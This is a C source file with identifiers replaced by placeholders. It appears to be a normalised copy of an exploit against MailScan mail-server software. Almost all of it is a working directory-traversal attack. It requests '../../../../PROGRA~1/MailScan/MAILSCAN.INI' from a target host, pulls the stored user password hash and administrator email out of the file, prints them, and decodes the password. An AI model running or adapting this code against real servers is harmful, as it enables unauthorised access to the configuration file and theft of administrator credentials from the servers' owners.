
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int buffer3 ;
typedef int buffer2 ;
typedef int HINTERNET ;
typedef int DWORD ;


 int FUNC_0 (char*) ;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_1 (int ) ;
 int FUNC_2 (int *,int ,int *,int *,int ) ;
 int FUNC_3 (int ,char*,int *,int *,int,int *) ;
 scalar_t__ FUNC_4 (int ,char*,int,int *) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (char*,char*,int) ;
 int FUNC_7 (char*,int ,int) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (char*,char*,...) ;
 int FUNC_10 (char*,char*,char*) ;
 int FUNC_11 (char*) ;
 char* FUNC_12 (char*,char*) ;

int FUNC_13(char *VAR_4,char *VAR_5)
{
 FUNC_8("[!] Targeting %s:%s\n",VAR_4,VAR_5);


 HINTERNET VAR_6, VAR_7;
 char VAR_8[1024];
 DWORD VAR_9;
 char *VAR_10;
 char *VAR_11 = "http://";
 char *VAR_12 = "/../../../../PROGRA~1/MailScan/MAILSCAN.INI";
 char VAR_13[1025];
 char VAR_14[1025];
 char VAR_15[1025];
 char VAR_16[1025];
 char VAR_17[1025];



 if((VAR_6 = FUNC_2(((void*)0), VAR_3, ((void*)0), ((void*)0), 0)))
 {
  FUNC_8("[!] Building request!\n");
  FUNC_7(VAR_13,0,1025);
  FUNC_6(VAR_13,VAR_11,FUNC_11(VAR_11));
  FUNC_6(VAR_13+FUNC_11(VAR_13),VAR_4,FUNC_11(VAR_4));
  FUNC_6(VAR_13+FUNC_11(VAR_13),":",FUNC_11(":"));
  FUNC_6(VAR_13+FUNC_11(VAR_13),VAR_5,FUNC_11(VAR_5));
  FUNC_6(VAR_13+FUNC_11(VAR_13),VAR_12,FUNC_11(VAR_12));
 }
 else
 {
  FUNC_8("[-] Error building request!\n");
  FUNC_1(VAR_6);
  FUNC_0(VAR_8);
  return 0;
 }

 FUNC_8("[!] Trying to connect @ %s:%s\n",VAR_4,VAR_5);
 if((VAR_7 = FUNC_3(VAR_6, VAR_13, ((void*)0), ((void*)0),
VAR_2 | VAR_1, ((void*)0))))
 {
  FUNC_8("[!] Connected to host!\n");
 }
 else
 {
  FUNC_8("[-] Error while connecting! \n");
  FUNC_1(VAR_6);
  FUNC_1(VAR_7);
  FUNC_0(VAR_8);
  return 0;
 }

 if(FUNC_4(VAR_7, VAR_8, sizeof(VAR_8), &VAR_9))
 {

  if((VAR_10 = FUNC_12(VAR_8, "[General]")))
  {

   VAR_10 = FUNC_12(VAR_8, "UserPassword=");
   FUNC_10(VAR_10, "UserPassword=%s ", VAR_14);

   VAR_10 = FUNC_12(VAR_8, "AdminEmailId=");
   FUNC_10(VAR_10, "AdminEmailId=%s ", VAR_15);

   VAR_10 = FUNC_12(VAR_8, "ProductName=");
   FUNC_10(VAR_10, "ProductName=%s ", VAR_16);

   VAR_10 = FUNC_12(VAR_8, "Version=");
   FUNC_10(VAR_10, "Version=%s ", VAR_17);
  }




 if( VAR_10==((void*)0) )
 {
  FUNC_8("[-] Server not vuln :(\n");

 }
 else
 {
  FUNC_8("[+] SERVER: %s %s\n",VAR_16,VAR_17);
  FUNC_8("[+] ADMIN: %s\n",VAR_15);
  FUNC_8("[+] HASH: %s\n",VAR_14);
  FUNC_8("[+] PASS: ");

  char VAR_18[sizeof(VAR_14)];
  char VAR_19[1025];

  FUNC_7(VAR_18,0,sizeof(VAR_14));

  for (int VAR_20=0;VAR_20 < FUNC_11(VAR_14); VAR_20++)
  {
   VAR_0++;

   FUNC_9(VAR_19,"%c",VAR_14[VAR_20]);
   FUNC_6(VAR_18+FUNC_11(VAR_18),VAR_19,FUNC_11(VAR_19));

   if(VAR_0 == 2)
   {
    char VAR_21[255];
    FUNC_7(VAR_21,0,sizeof(255));
    FUNC_9(VAR_21,"%s",VAR_18);

    FUNC_5(VAR_21);
    FUNC_7(VAR_18,0,1025);
    VAR_0 = 0;
   }
  }
  FUNC_8("\n[+] Done!\n");
 }
 }
 else
 {
  FUNC_8("[-] Server not vuln :(\n");
 }

 FUNC_1(VAR_6);
 FUNC_1(VAR_7);
 FUNC_0(VAR_8);

 return 0;
}
